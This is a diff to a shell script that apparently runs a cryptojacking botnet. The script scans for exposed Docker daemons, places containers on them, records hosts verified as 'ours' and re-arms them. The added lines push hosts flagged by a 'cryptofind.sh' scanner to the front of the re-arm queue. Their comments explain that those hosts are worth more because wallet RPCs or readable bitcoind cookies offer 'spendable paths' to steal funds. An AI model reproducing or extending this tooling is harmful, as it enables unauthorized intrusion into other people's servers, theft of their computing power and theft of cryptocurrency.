@@ -87,6 +87,7 @@ SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
 LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
+CRYPTOFILE="$WORK/crypto.list"    # ip<TAB>score<TAB>evidence, from cryptofind.sh
 touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
 LIVE="$WORK/dock.live"       # ip<TAB>epoch, appended whenever a host is VERIFIED running
                              # ours. Appended (not truncated) so dockhot.sh and dock.sh
@@ -152,6 +153,15 @@ if [ "$REARM" = yes ]; then
     # single live host.
     if [ -s "$LIVE" ]; then
         { cut -f1 "$LIVE" 2>/dev/null || :; } \
+            | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
+    fi
+    if [ -s "$CRYPTOFILE" ]; then
+        # Crypto boxes next. Same CPU as any other host, so they mine the same - but the
+        # loot is different, and some RPCs cryptofind.sh finds are spendable paths (a
+        # wallet RPC answering get_balance, a bitcoind whose .cookie is readable through
+        # docker). Walking them ahead of the general ledger puts the scarce re-arm budget
+        # on the hosts actually worth reading.
+        cut -f1 "$CRYPTOFILE" 2>/dev/null \
             | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
     fi
     if [ -s "$MOCKFILE" ]; then
